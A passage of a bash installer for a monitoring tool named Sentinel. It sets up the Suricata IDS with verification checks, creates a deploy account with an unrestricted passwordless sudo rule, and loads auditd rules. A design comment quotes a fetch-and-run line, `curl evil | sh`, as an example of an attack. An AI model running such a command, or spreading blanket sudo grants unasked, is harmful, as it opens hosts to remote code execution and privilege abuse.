SURICATA_STATS=/var/log/suricata/stats.log

# How long step 35 waits for the first packet to reach eve.json.
#
# Not a politeness margin. Suricata daemonises immediately and then spends
# minutes parsing the ET Open ruleset before a single capture thread starts;
# eve.json is empty for all of it. Measured on the Ubuntu 24.04.4 test host
# (suricata 7.0.3, 4 GB RAM, ~46k rules): about 2m20s from `systemctl restart`
# to the capture threads coming up. A window shorter than that reports every
# healthy install as unconfirmed, and a warning that appears on every deploy is
# a warning nobody reads by the third one.
SURICATA_CAPTURE_WAIT_S=210

# How long step 35 waits to prove stats.log has STOPPED growing.
#
# Proving a negative needs the whole window, unlike the eve.json check above,
# which can stop early the moment a byte lands. Suricata's default counters
# interval (the top-level `stats: interval:` block — untouched by this change)
# is 8s, so 20s covers two ticks with margin. An operator who raised that
# interval well past this window will not see a false "still growing" here —
# they will see a false "stopped", for one run — but the SAME check runs again
# on the next deploy, against the SAME file, so a real failure to disable it
# does not go unnoticed, only delayed by one deploy.
SURICATA_STATS_WAIT_S=20

# /proc, as a variable purely so the checks below can be exercised against a
# made-up process instead of only on a live host.
SURICATA_PROC_DIR=/proc

# The argv of the process systemd is actually tracking.
#
# NOT `systemctl show -p ExecStart`, which reports what the unit ASKS for. On a
# host where the unit was rewritten and nothing restarted, the two disagree, and
# the one that decides whether packets are captured is this one.
suricata_running_argv() {
    local pid
    pid="$(systemctl show suricata -p MainPID --value 2>/dev/null || true)"
    [[ "$pid" =~ ^[1-9][0-9]*$ ]] || return 1
    [[ -r "${SURICATA_PROC_DIR}/${pid}/cmdline" ]] || return 1
    tr '\0' ' ' < "${SURICATA_PROC_DIR}/${pid}/cmdline"
}

# The drop-in that layers Sentinel's requirements onto the packaged unit.
#
# MemoryMax goes on both families: a NIDS on a small VPS must have a ceiling, or
# a rule explosion OOM-kills whatever it was meant to protect.
#
# The EnvironmentFile/ExecStart pair goes only where the packaged unit does not
# already read OPTIONS — see suricata_unit_reads_options in distro.sh for what
# was measured on each family. `ExecStart=` on its own clears the packaged
# command; the line after it re-issues the same command with $OPTIONS appended,
# unquoted so that systemd word-splits it into arguments.
#
# The binary and the pid file are read off the unit that is installed rather
# than written down here: a pid file that disagrees with the unit's PIDFile=
# makes systemd abandon a Type=forking service that started perfectly well.
suricata_dropin_body() {
    printf '[Service]\nMemoryMax=1G\nRestart=on-failure\nRestartSec=5\n'
    suricata_unit_reads_options && return 0

    local bin pidfile
    bin="$(command -v suricata 2>/dev/null || true)"
    if [[ -z "$bin" ]]; then
        # No override rather than a broken one. An ExecStart with an empty
        # binary makes systemd refuse to start the unit at all, which is a worse
        # outcome than a daemon watching the wrong interface.
        return 1
    fi
    pidfile="$(systemctl show suricata -p PIDFile --value 2>/dev/null || true)"
    printf 'EnvironmentFile=-%s\nExecStart=\nExecStart=%s -D -c %s --pidfile %s $OPTIONS\n' \
        "$(suricata_defaults_file)" "$bin" "$SURICATA_YAML" "${pidfile:-/run/suricata.pid}"
}

# Why the running daemon has to be restarted, or nothing when it does not.
#
# `systemctl enable --now` on a service that is already up is a NO-OP, and the
# process then keeps running the PREVIOUS deployment's argv while the step
# reports success — one of the exact failures CLAUDE.md lists. So the question
# asked here is about the argv that is up, not about the unit file, and "cannot
# tell" is answered with a restart rather than with silence.
suricata_needs_restart() {
    local want="$1" argv
    if ! argv="$(suricata_running_argv)"; then
        printf 'no process is running under the unit yet'
        return 0
    fi
    [[ "$argv" == *"$want"* ]] && return 1
    printf 'its command line does not carry the options just written'
    return 0
}

# The capture interface that argv actually selects, or nothing.
#
# `--af-packet=<dev>` names it. A BARE `--af-packet` does not: it means "take
# the interface list out of suricata.yaml", and the packaged file says
# `interface: eth0` on a host whose NIC is enp0s3. Returning nothing for that
# case is the entire point of this function — it is the state step 35 used to
# print as "IDS on enp0s3" while eve.json, fast.log and stats.log were all at
# 0 bytes and the daemon was restarting every two and a half minutes.
suricata_argv_iface() {
    [[ "$1" =~ (^|[[:space:]])--af-packet=([^[:space:]]+) ]] || return 1
    printf '%s' "${BASH_REMATCH[2]}"
}

# HOME_NET as the RUNNING process resolves it.
#
# Asked of Suricata's own config parser, with the `--set` overrides recovered
# from the running argv, because the merge of yaml and command line is what
# decides whether an EXTERNAL_NET -> HOME_NET rule can ever match. Reading
# suricata.yaml directly would report the packaged RFC1918 default on a host
# where the command line overrides it, and the command line on a host where it
# does not reach the process at all.
#
# Empty output means "could not be read", which the caller reports as unknown.
suricata_effective_home_net() {
    local sets
    # `|| true` on both pipelines, not to hide failure but because failure here
    # is the "unknown" case and the caller reports it as such: an abort would
    # end the install instead of saying what could not be read.
    sets="$(grep -oE -- '--set[[:space:]]+[^[:space:]]+' <<< "$1" | tr '\n' ' ' || true)"
    # shellcheck disable=SC2086
    suricata --dump-config -c "$SURICATA_YAML" $sets 2>/dev/null \
        | awk -F' = ' '$1 == "vars.address-groups.HOME_NET" { print $2; exit }' || true
}

# Bytes in eve.json right now; 0 when it is not there yet.
suricata_eve_size() {
    stat -c %s "$SURICATA_EVE" 2>/dev/null || printf '0'
}

# Bytes in stats.log right now; 0 when it is not there.
suricata_stats_size() {
    stat -c %s "$SURICATA_STATS" 2>/dev/null || printf '0'
}

# Turns off the ONE output that writes stats.log, narrowly and idempotently.
#
# Measured on the production host, 2026-08-30: stats.log and its rotated
# copies came to roughly 120 MB/day, and nothing Sentinel ships reads it —
# `grep -rn stats.log sentinel/ deploy/ scripts/` finds three historical
# comments and no code; the collector reads eve.json. On a host with 7.6 GB of
# RAM and ~2.8 GB of page cache, that is not "just disk": it is continuous
# pressure on the exact cache a slow dashboard query already exhausted once
# (see step_configs' logrotate comment for that history).
#
# The comment above step_suricata says the distro's suricata.yaml is not ours
# to REPLACE. It does not say the file is not ours to edit narrowly, and there
# is no `--set` override for a single entry inside the `outputs:` list — that
# mechanism only reaches leaf keys like vars.address-groups.HOME_NET, not one
# item picked out of a YAML sequence. So this follows the OTHER precedent
# already on this host, `nginx_disable_default_listener`: a single, marked,
# idempotent line edit, not a rewrite.
#
# `filename: stats.log` is the anchor because it names exactly one output. A
# packaged suricata.yaml carries a SECOND, unrelated `stats:` block at the top
# level (the internal counters interval, which this does not touch) and can
# carry a THIRD, nested `- stats:` entry inside eve-log's own `types:` list
# (the periodic stats record folded into eve.json, which the task explicitly
# forbids touching) — neither of those has a `filename:` key, so neither is
# ever mistaken for this one.
#
# Returns 0 having just disabled it, 1 if it was already disabled (by an
# earlier run of this or by the operator), 2 if the file is missing, the
# anchor is not found or not unique, or the line above it is not a plain
# `enabled: yes`/`enabled: no` — any shape this was not written to recognise,
# left untouched rather than guessed at.
suricata_disable_stats_output() {
    [[ -f "$SURICATA_YAML" ]] || {
        printf 'stats.log output not checked: %s does not exist\n' "$SURICATA_YAML"
        return 2
    }

    local anchor_count anchor_line enabled_no enabled_line marker
    marker="SENTINEL-DISABLED: stats.log ran ~120MB/day and nothing reads it (deploy/install.sh step_suricata, 2026-08-30)"

    # `grep -c` always prints a count, 0 included, even on no match — so this
    # is safe under `set -e` without an `|| true`.
    anchor_count="$(grep -cE '^[[:space:]]*filename:[[:space:]]*stats\.log[[:space:]]*$' "$SURICATA_YAML")"

    if (( anchor_count == 0 )); then
        printf 'no "filename: stats.log" line in %s; nothing to disable there, or it is already gone\n' \
            "$SURICATA_YAML"
        return 2
    fi
    if (( anchor_count > 1 )); then
        printf '%d "filename: stats.log" lines in %s, expected exactly 1; not editing a file this ambiguous about which one it means\n' \
            "$anchor_count" "$SURICATA_YAML"
        return 2
    fi

    anchor_line="$(grep -nE '^[[:space:]]*filename:[[:space:]]*stats\.log[[:space:]]*$' "$SURICATA_YAML" | cut -d: -f1)"
    enabled_no=$((anchor_line - 1))
    enabled_line="$(sed -n "${enabled_no}p" "$SURICATA_YAML")"

    # Already off — ours or the operator's, either is fine, neither is edited
    # again.
    if [[ "$enabled_line" =~ ^[[:space:]]*enabled:[[:space:]]*no[[:space:]]*(#.*)?$ ]]; then
        printf 'stats.log output already disabled (line %d of %s)\n' "$enabled_no" "$SURICATA_YAML"
        return 1
    fi

    if [[ ! "$enabled_line" =~ ^[[:space:]]*enabled:[[:space:]]*yes[[:space:]]*$ ]]; then
        printf 'line %d of %s, immediately above "filename: stats.log", is %s — not a plain "enabled: yes"; leaving a shape this was not written for alone\n' \
            "$enabled_no" "$SURICATA_YAML" "${enabled_line:-<empty>}"
        return 2
    fi

    sed -i -E "${enabled_no}s|^([[:space:]]*)enabled:[[:space:]]*yes[[:space:]]*\$|\1enabled: no  # ${marker}|" \
        "$SURICATA_YAML"

    printf 'disabled stats.log output (line %d of %s was "enabled: yes"); undo: edit that line back to "enabled: yes" and restart suricata\n' \
        "$enabled_no" "$SURICATA_YAML"
    return 0
}

# Step 35's verdict, assembled out of things this host can be observed doing.
#
# Nothing here trusts `systemctl is-active`. It said `active` on the Ubuntu host
# that captured nothing: the daemon failed to open its socket, exited, and
# systemd restarted it every 2m20s, so a single is-active lands in the `active`
# phase nearly every time.
suricata_report_effect() {
    local want_iface="$1" want_ip="$2" bpf_file="$3" eve_before="$4"
    local argv iface home_net problems=()

    if ! argv="$(suricata_running_argv)"; then
        warn "suricata is installed but no process is running under its unit, so \
NOTHING is being captured. Look at:
    systemctl status suricata ; journalctl -u suricata -n 50"
        return 0
    fi

    if iface="$(suricata_argv_iface "$argv")"; then
        if ! ip -o link show "$iface" >/dev/null 2>&1; then
            problems+=("it was told to capture on ${iface}, which is not an interface on this host")
        elif [[ "$iface" != "$want_iface" ]]; then
            problems+=("it is capturing on ${iface}, not on ${want_iface} — the interface of the default route")
        fi
    else
        iface="?"
        problems+=("its command line names NO interface, so it is using the list in \
${SURICATA_YAML}; on a packaged file that is an example device, not this host's NIC")
    fi

    home_net="$(suricata_effective_home_net "$argv")"
    if [[ -z "$home_net" ]]; then
        problems+=("HOME_NET could not be read back from the effective configuration, \
so whether inbound-attack rules can match is UNKNOWN")
    elif [[ -n "$want_ip" && "$home_net" != *"$want_ip"* ]]; then
        problems+=("HOME_NET is ${home_net} and does not contain ${want_ip}; every \
EXTERNAL_NET -> HOME_NET rule — which is most of the ruleset — can never match")
    fi

    if [[ -n "$bpf_file" && "$argv" != *"-F ${bpf_file}"* ]]; then
        problems+=("the BPF exclusion file ${bpf_file} is not on its command line, so \
the dominant flow preflight told us to drop is being inspected and written to disk")
    fi

    # And then the one fact that settles it: bytes arriving in eve.json.
    # Growth, not existence — on a re-deploy the file already holds yesterday's
    # bytes, and its presence proves nothing about today.
    local waited=0 eve_now
    eve_now="$(suricata_eve_size)"
    while (( eve_now <= eve_before && waited < SURICATA_CAPTURE_WAIT_S )); do
        sleep 5
        waited=$((waited + 5))
        eve_now="$(suricata_eve_size)"
    done

    if (( ${#problems[@]} )); then
        warn "Suricata is running and is NOT watching this host correctly:
    $(printf '%s\n    ' "${problems[@]}")
    eve.json went ${eve_before} -> ${eve_now} bytes in ${waited}s.
    Its command line is: ${argv}"
    elif (( eve_now > eve_before )); then
        ok "Suricata capturing on ${iface}, HOME_NET ${home_net}, eve.json growing \
(${eve_before} -> ${eve_now} bytes in ${waited}s), MemoryMax=1G"
    else
        warn "Suricata was started with the right interface (${iface}) and HOME_NET \
(${home_net}), but eve.json did not grow in ${waited}s — capture is NOT confirmed. \
A freshly updated ruleset can still be loading. Confirm before trusting the IDS:
    ls -l ${SURICATA_EVE} ; journalctl -u suricata -n 30"
    fi
}

# The proof that stats.log stopped, as opposed to the yaml line saying it did.
#
# A rewritten `enabled: no` is a file on disk, not a daemon that read it. This
# runs every step-35, disabled or not, changed just now or already — so a
# package upgrade that quietly restores `enabled: yes` in a future conffile
# merge is caught on the very next deploy, the same way an operator's own
# revert would be, rather than only on the one run that happened to flip it.
suricata_report_stats_effect() {
    local before="$1" waited=0 after
    after="$(suricata_stats_size)"
    while (( waited < SURICATA_STATS_WAIT_S )); do
        (( after > before )) && break
        sleep 5
        waited=$((waited + 5))
        after="$(suricata_stats_size)"
    done

    if (( after > before )); then
        warn "stats.log grew ${before} -> ${after} bytes in ${waited}s AFTER being marked \
disabled — it is STILL being written, so the edit did not take effect (or something \
else re-enabled it). Check:
    systemctl status suricata ; grep -n -B1 'filename: stats.log' ${SURICATA_YAML}"
    else
        ok "stats.log stayed at ${after} bytes for ${waited}s — the output is off"
    fi
}

step_suricata() {
    if (( ! SURICATA_OK )); then
        info "Suricata skipped (RAM gate). Sentinel runs log-only."
        return 0
    fi
    pkg_install "$(suricata_pkg)" || { warn "suricata install failed; continuing log-only"; return 0; }

    # We do NOT replace the distro suricata.yaml — it is complete and passes -T.
    # Everything site-specific is layered on top via OPTIONS, a BPF file, a
    # drop-in and an ACL, so an upgrade of the package never clobbers our config.
    local iface bpf bpf_file pubip options
    iface="$(ip route show default 2>/dev/null | awk '/default/{print $5; exit}')"
    iface="${iface:-eth0}"
    pubip="$(public_ips 2>/dev/null | head -1)"

    # Inspecting a high-volume, low-value flow is the fastest way to fill the
    # disk. Preflight flags the dominant one; exclude it in the kernel BPF so
    # Suricata never even sees those packets.
    bpf=""
    bpf_file=""
    [[ -n "${BPF_HINT:-}" ]] && bpf="not host ${BPF_HINT}"
    options="--af-packet=${iface}"
    if [[ -n "${bpf}" ]]; then
        bpf_file=/etc/suricata/capture-filter.bpf
        printf '%s\n' "${bpf}" > "$bpf_file"
        options+=" -F ${bpf_file}"
        info "Suricata BPF excludes: ${bpf}"
    fi
    # HOME_NET must include this host's public address or inbound-attack rules
    # (EXTERNAL_NET -> HOME_NET) never match. The distro default is RFC1918 only.
    [[ -n "${pubip}" ]] && options+=" --set vars.address-groups.HOME_NET=[${pubip}]"

    printf 'OPTIONS="%s"\n' "${options}" > "$(suricata_defaults_file)"

    # -- and then make sure the unit actually READS that file ------------------
    local dropin=/etc/systemd/system/suricata.service.d/sentinel.conf
    local dropin_body
    dropin_body="$(suricata_dropin_body)" || \
        warn "suricata is not on PATH, so the unit cannot be handed ${options}; the \
daemon will capture on whatever ${SURICATA_YAML} names, which is not this host's NIC."
    install -d -m 0755 /etc/systemd/system/suricata.service.d
    printf '%s\n' "$dropin_body" > "$dropin"
    systemctl daemon-reload

    # The unprivileged ingest daemon reads eve.json. A per-user ACL grants
    # exactly read, and a default ACL keeps it working across logrotate.
    install -d -m 0750 /var/log/suricata
    if have setfacl; then
        setfacl -R -m u:"${SENTINEL_USER}":rX /var/log/suricata 2>/dev/null || true
        setfacl -R -d -m u:"${SENTINEL_USER}":rX /var/log/suricata 2>/dev/null || true
    fi

    # stats.log: an output nobody reads, at ~120 MB/day on the production
    # host. This runs BEFORE the -T test below on purpose — a broken edit
    # fails there, exactly like a broken OPTIONS or drop-in already does,
    # rather than being caught nowhere.
    local stats_status=0 stats_msg
    stats_msg="$(suricata_disable_stats_output)" || stats_status=$?
    case $stats_status in
        0) ok "$stats_msg" ;;
        1) info "$stats_msg" ;;
        *) warn "$stats_msg" ;;
    esac

    suricata-update >/dev/null 2>&1 || warn "suricata-update failed; using shipped rules"
    # A rejected configuration stops the IDS work here and NOTHING else.
    #
    # This was a `die`, which was survivable while step 35 ran once on a fresh
    # install. It is in ALWAYS_STEPS now, so it runs on every deploy — and a
    # `die` would abort the run before step 37 installs the audit rules, before
    # the smoke test, and before step 40 tells the operator anything at all. One
    # bad ruleset would take the whole deployment down with it.
    #
    # The daemon is deliberately NOT restarted on this path either: what is
    # running now started from a configuration that passed, and replacing it with
    # one that has just failed turns a warning into an outage.
    # shellcheck disable=SC2086
    if ! suricata -T -c "$SURICATA_YAML" ${options}; then
        warn "'suricata -T' rejected this configuration, so the daemon was NOT \
restarted and is still running whatever it started with. $(suricata_defaults_file) and \
the systemd drop-in have ALREADY been rewritten with the options that failed the test, \
so a reboot would start suricata with them. The error is printed above. Fix it and \
re-run this step:  --force-step 35"
        return 0
    fi

    systemctl enable suricata >/dev/null 2>&1 || true
    local restart_reason=""
    restart_reason="$(suricata_needs_restart "$options")" || restart_reason=""

    # Disabling an output is a change to the config the running process
    # already parsed at startup — SIGHUP only makes Suricata reopen files it
    # already has open for rotation, it does not re-read the outputs list, so
    # the daemon would otherwise keep writing stats.log under the OLD config
    # for however long it happened to run next.
    if [[ -z "$restart_reason" && $stats_status -eq 0 ]]; then
        restart_reason="stats.log output was just disabled in ${SURICATA_YAML}, and only a full restart re-reads the outputs list"
    fi

    if [[ -n "$restart_reason" ]]; then
        info "restarting suricata: ${restart_reason}"
        systemctl restart suricata || warn "systemctl restart suricata returned non-zero"
    else
        info "suricata already runs with these options; not restarting it"
    fi

    local eve_before; eve_before="$(suricata_eve_size)"
    suricata_report_effect "$iface" "$pubip" "$bpf_file" "$eve_before"

    local stats_before; stats_before="$(suricata_stats_size)"
    suricata_report_stats_effect "$stats_before"
}

# --- 36 -------------------------------------------------------------------
# The account automation logs in as, kept apart from yours.
#
# ## Why this exists
#
# The login-history feature alerts on every INTERACTIVE session — one with a
# terminal — and stays quiet for sessions without one. That works today only
# because every automation on this host happens to run `ssh host "command"`,
# which allocates no tty. It is a proxy, not a boundary: anyone holding the key
# can run `ssh host "curl evil | sh"` and get the same silence.
#
# Measured on 24 August 2026, the host had exactly ONE authorised key, and both
# the operator and the deploy scripts used it. There was nothing to tell them
# apart — not the key fingerprint, not the source address, not the account.
#
# With a separate account, "no terminal" stops being the discriminator and
# IDENTITY takes over: a session on the deploy account is automation, and a
# session without a terminal on the OPERATOR account becomes a surprise again.
#
# ## What this step does NOT do
#
# It does not create a key. The private half must never exist on this host, and
# never passes through this script: the operator generates it on their own
# machine and installs only the public half. A deploy key generated by the thing
# being deployed to is a key the host has seen.
#
# It also does not switch the deploy scripts over. The account is created and
# left ready; `scripts/deploy.sh --user` is the operator's to change, once they
# have confirmed they can log in with it. A step that flipped both at once would
# make the first failure a lockout.
DEPLOY_ACCOUNT="${DEPLOY_ACCOUNT:-sentinel-deploy}"

step_deploy_account() {
    if ! id -u "$DEPLOY_ACCOUNT" >/dev/null 2>&1; then
        # `--system` deliberately NOT used: a system account gets a uid below
        # 1000, and every audit rule on this host filters on `auid>=1000` or
        # `auid!=unset`. A system account would be invisible to exactly the
        # history this account exists to be distinguishable in.
        useradd --create-home --shell /bin/bash \
                --comment "Sentinel automation (deploys, diagnostics)" \
                "$DEPLOY_ACCOUNT"
        ok "created ${DEPLOY_ACCOUNT}"
    else
        ok "${DEPLOY_ACCOUNT} already exists"
    fi

    install -d -m 0700 -o "$DEPLOY_ACCOUNT" -g "$DEPLOY_ACCOUNT" \
            "/home/${DEPLOY_ACCOUNT}/.ssh"
    touch "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys"
    chown "${DEPLOY_ACCOUNT}:${DEPLOY_ACCOUNT}" "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys"
    chmod 0600 "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys"

    # sudo without a password, because a deploy runs unattended and a prompt it
    # cannot answer is a deploy that hangs until it times out. Scoped to ALL
    # rather than a command list, and that is a deliberate, stated choice: the
    # installer runs dnf, systemctl, nft, useradd, install, tee and more, and a
    # list that drifts out of date fails a deploy halfway through — which is the
    # single most dangerous moment to fail.
    #
    # What makes this survivable is that the account is now VISIBLE: every
    # command it runs lands in `session_commands` with its arguments, forever.
    # The trade is "unrestricted but fully recorded" over "restricted, drifting,
    # and recorded" — and the second only looks safer.
    # The filename carries a numeric prefix and the word "account", and BOTH
    # halves are scar tissue from 25 August 2026.
    #
    # The first version wrote `/etc/sudoers.d/sentinel-deploy` — the obvious
    # name, and the same one the operator had already used by hand for their own
    # NOPASSWD rule, because `docs/CHANGELOG.md` 0.6.0 says a deploy from Windows
    # needs one. The step overwrote it. Nothing failed, nothing warned: the file
    # validated, the step reported success, and the operator's passwordless sudo
    # was simply gone until the next time they tried to use it.
    #
    # So: a name this step owns, and a REFUSAL to touch anything else.
    local sudoers=/etc/sudoers.d/60-sentinel-deploy-account
    local marker="# managed by sentinel install.sh step_deploy_account"

    # Never clobber a file we did not write. A hand-made rule with our name on it
    # is somebody's access, and losing it is exactly the failure above.
    if [[ -e "$sudoers" ]] && ! grep -qF "$marker" "$sudoers"; then
        warn "${sudoers} exists and was not written by this step — leaving it alone."
        warn "Nothing was changed. If it should hold the automation rule, move it aside first."
        return 0
    fi

    printf '%s\n%s ALL=(ALL) NOPASSWD: ALL\n' "$marker" "$DEPLOY_ACCOUNT" > "$sudoers"
    chmod 0440 "$sudoers"
    # Not `visudo -c` on the whole tree — on the FILE. A syntax error anywhere in
    # sudoers.d makes sudo refuse everything for everyone, including the operator
    # recovering from it. Checked before it can take effect.
    if ! visudo -cf "$sudoers" >/dev/null; then
        rm -f "$sudoers"
        die "the sudoers fragment for ${DEPLOY_ACCOUNT} did not validate; removed"
    fi
    ok "sudo rule for ${DEPLOY_ACCOUNT} installed and validated"

    # The wreckage of the first version, if this host ran it. That file used to
    # hold the OPERATOR's rule on hosts where they had written one; now it holds
    # only ours, and the operator's passwordless sudo is gone without a word.
    #
    # Detected rather than repaired: we do not know what their rule said, and
    # writing a guess into sudoers is worse than saying what happened.
    local clobbered=/etc/sudoers.d/sentinel-deploy
    if [[ -f "$clobbered" ]] \
       && grep -q "^${DEPLOY_ACCOUNT} ALL=" "$clobbered" \
       && [[ "$(wc -l < "$clobbered")" -le 2 ]]; then
        warn "${clobbered} contains ONLY the automation rule."
        warn "An earlier version of this step wrote that file, and on hosts where"
        warn "you kept your own NOPASSWD rule there, it was overwritten — which is"
        warn "why sudo may now ask you for a password. Restore yours with:"
        warn "    echo '<your-user> ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/50-operator"
        warn "    sudo chmod 0440 /etc/sudoers.d/50-operator && sudo visudo -c"
        warn "Then remove the stale file: sudo rm -f ${clobbered}"
    fi

    # The effect, not the intent. An account with no key cannot log in, and
    # saying "created" about it would be the same class of lie this whole
    # repository keeps tripping over.
    if [[ ! -s "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys" ]]; then
        warn "${DEPLOY_ACCOUNT} has NO authorised key yet, so it cannot log in."
        warn "Generate one on YOUR machine (the private half must never reach this host):"
        warn "    ssh-keygen -t ed25519 -f ~/.ssh/sentinel_deploy -C sentinel-deploy"
        warn "Then install the public half:"
        warn "    ssh-copy-id -i ~/.ssh/sentinel_deploy.pub ${DEPLOY_ACCOUNT}@<host>"
        warn "Then switch the deploy scripts over:"
        warn "    scripts/deploy.sh --user ${DEPLOY_ACCOUNT} --key ~/.ssh/sentinel_deploy …"
    else
        local keys
        keys="$(grep -c '^ssh-' "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys" || true)"
        ok "${DEPLOY_ACCOUNT} has ${keys} authorised key(s)"
    fi
}

# One line of a rules file -> the identity that survives a round trip through
# the kernel.
#
# Comparing rule TEXT is not possible, and that is why the previous version of
# this compared keys instead. Measured on Ubuntu 24.04.4, `auditctl -l` hands
# back what it was given, rewritten:
#
#   -F a1&07000                              as   -F a1&0xE00
#   -F auid!=unset                           as   -F auid!=-1
#   -S init_module,finit_module,delete_module     reordered
#   a watch's key as  -k <key>  ,  a syscall rule's key as  -F key=<key>
#
# So each rule is identified by the one field that comes back intact: a watch by
# its path, a keyed rule by its key, a suppression by its directory. A line that
# matches none of those is reported as unchecked rather than counted as present
# — "I cannot check this" and "this is loaded" are different answers, and only
# one of them is true.
audit_rule_signatures() {
    awk '
        /^[[:space:]]*#/ { next }
        /^[[:space:]]*$/ { next }
        /^-w[[:space:]]/                  { print "watch " $2; next }
        match($0, /-F key=[^ ]+/)         { print "key " substr($0, RSTART + 7, RLENGTH - 7); next }
        match($0, /(^| )-k +[^ ]+/)       { s = substr($0, RSTART, RLENGTH)
                                            sub(/^ ?-k +/, "", s)
                                            print "key " s; next }
        match($0, /-F dir=[^ ]+/)         { print "dir " substr($0, RSTART + 7, RLENGTH - 7); next }
        /^-b[[:space:]]/                  { print "option -b " $2; next }
        /^--backlog_wait_time[[:space:]]/ { print "option --backlog_wait_time " $2; next }
        { print "unchecked " $0 }
    '
}

# The rules THIS host can load, and the `-F dir=` lines it cannot.
#
# MEASURED on the Ubuntu 24.04.4 VM (10.30.1.134) on 26 August 2026, before any
# of this was written:
#
#   * `-a never,exit -F dir=/nonexistent` is REFUSED by the kernel with
#     "Error sending add rule data request (No such file or directory)". The path
#     has to resolve AT LOAD TIME. It does not even have to be a directory —
#     `-F dir=/etc/passwd` loads.
#   * `auditctl -R`, which is what `augenrules --load` runs, STOPS at the first
#     refused line; everything after it is never offered to the kernel. With
#     /var/lib/docker absent, 27 of the 30 shipped rules were loaded, and the two
#     suppressions that FOLLOW it — /opt/sentinel and /var/lib/sentinel — were
#     among the three lost, so Sentinel audited its own writes. That is the exact
#     noise those lines exist to remove. Measured again with an empty
#     /var/lib/docker created by hand: all 30 loaded.
#   * `-w /nonexistent -p wa -k x` loads FINE. Only `-F dir=` needs its path, so
#     only `-F dir=` is filtered here.
#   * a loaded `-F dir=` rule DISAPPEARS from `auditctl -l` the moment the
#     directory is removed, and does not come back when it is recreated. That is
#     why this filters rather than creating the directory: a /var/lib/docker we
#     invented would be a claim that docker is here, and would still be one
#     `rmdir` away from silently dropping the suppression.
#
# So a `-F dir=` rule whose path is absent is left OUT of the file that goes to
# /etc/audit/rules.d, and the caller NAMES it. Everything else passes through
# byte for byte: on a host where every path is present — every RHEL host in
# production, which has docker — the installed file is identical to the shipped
# one, and so is what the kernel ends up holding.
#
# Writes the kept rules to $1; prints the dropped lines on stdout.
audit_rules_for_this_host() {
    local dest="$1" line dir
    : > "$dest"
    while IFS= read -r line || [[ -n "$line" ]]; do
        if [[ "$line" =~ ^[[:space:]]*-[aA][[:space:]] ]] &&
           [[ "$line" =~ -F[[:space:]]+dir=([^[:space:]]+) ]]; then
            dir="${BASH_REMATCH[1]}"
            if [[ ! -e "$dir" ]]; then
                printf '%s\n' "$line"
                continue
            fi
        fi
        printf '%s\n' "$line" >> "$dest"
    done
}

install_audit_rules() {
    local src="${SCRIPT_DIR}/audit/sentinel.rules"
    [[ -f "$src" ]] || return 0

    # What reaches /etc/audit/rules.d is what this host can load, not the whole
    # shipped file — see audit_rules_for_this_host for what was measured and why.
    # It has to be the FILE that is filtered, not just the load: augenrules also
    # runs at boot, from the same directory, with nobody watching.
    local staged line
    local -a dropped=()
    staged="$(mktemp)"
    while IFS= read -r line; do
        [[ -n "$line" ]] && dropped+=("$line")
    done < <(audit_rules_for_this_host "$staged" < "$src")
    install -D -m 0640 "$staged" "$AUDITD_RULES_DEST"
    rm -f "$staged"

    # Named, not silent — but not a red line on every deploy either. A `never`
    # suppression for a directory that does not exist suppresses nothing, so
    # leaving it out changes no behaviour and this is an info. Anything else
    # dropped IS a rule this host is missing, and joins the verdict below.
    local -a dropped_never=() dropped_other=()
    for line in ${dropped[@]+"${dropped[@]}"}; do
        if [[ "$line" == *never,exit* ]]; then
            dropped_never+=("$line")
        else
            dropped_other+=("$line")
        fi
    done
    if (( ${#dropped_never[@]} )); then
        info "auditd: ${#dropped_never[@]} suppression rule(s) left out of \
${AUDITD_RULES_DEST}, because their directory does not exist on this host. The kernel \
refuses '-F dir=' on a path that is not there, and auditctl -R stops at it, losing \
every rule after it:
    $(printf '%s\n    ' "${dropped_never[@]}")
    They suppress nothing here. If that software is installed later, re-run this \
step:  --force-step 37"
    fi

    if ! have auditctl || ! have augenrules; then
        warn "the audit rules are on disk at ${AUDITD_RULES_DEST} and \
NOTHING loaded them — this host has no auditctl/augenrules. Every host.* detection, \
plus auth.new_user and auth.new_ssh_key, has no source."
        return 0
    fi

    # NOT `2>/dev/null`. The kernel validates each rule on load and rejects the
    # ones it does not understand, one at a time, on stderr. Discarding that
    # output means a rejected rule looks exactly like a loaded one.
    local raw
    raw="$(augenrules --load 2>&1)" || true

    # But not everything in there is an error, and the whole lot was being shown
    # to the operator under the heading "augenrules failed". Measured on Ubuntu
    # 24.04.4: a second deploy prints "/usr/sbin/augenrules: No change" — the
    # generated audit.rules is byte-identical to the one already installed,
    # which is the ordinary outcome of deploying twice — and then loads it
    # anyway. auditctl additionally echoes a full status block for every -b /
    # --backlog_wait_time line it is fed. Reporting a wall of that as a failure
    # is how an operator learns to skip past the line where the real error is.
    #
    # The bare `No rules` line is the same kind of noise, and it cost an extra
    # round to spot because until 27 August 2026 a real error was always printed
    # beside it. MEASURED on the VM that day: `auditctl -D` prints `No rules` on
    # stdout EVERY time, including the run where it had just deleted 29 rules,
    # and `augenrules --load` runs `auditctl -D` before `auditctl -R`. Left in,
    # it turns a perfectly healthy host into "augenrules did not load the whole
    # file: No rules" on every deploy. Nothing is lost by dropping it: the
    # question it looks like it answers is answered properly a few lines below,
    # by counting every rule against `auditctl -l`.
    local errs
    errs="$(printf '%s\n' "$raw" \
        | grep -vE '^[^:]*augenrules: (No change|No rules)$' \
        | grep -vE '^No rules$' \
        | grep -vE '^(enabled|failure|pid|rate_limit|backlog_limit|lost|backlog|backlog_wait_time|backlog_wait_time_actual|loginuid_immutable) [0-9]+$' \
        | grep -vE '^[[:space:]]*$' || true)"

    # And then count against the kernel, RULE by rule.
    #
    # Per key was not enough. A rejected rule that shares its key with a loaded
    # one is invisible that way, and on this host that is not hypothetical:
    # `auditctl -R` stops at the first rule it cannot add, so
    # `-a never,exit -F dir=/var/lib/docker` failing on a host without docker
    # takes the two suppression rules after it down with it — silently, because
    # suppression rules carry no key at all.
    local -A want_sig=() have_sig=()
    local n sig
    while read -r n sig; do
        [[ -n "$sig" ]] && want_sig["$sig"]="$n"
    # The INSTALLED file, not the shipped one: that is what was offered to the
    # kernel, and counting the shipped file here would report a rule this host
    # deliberately does not have as one the kernel refused.
    done < <(audit_rule_signatures < "$AUDITD_RULES_DEST" | sort | uniq -c)
    while read -r n sig; do
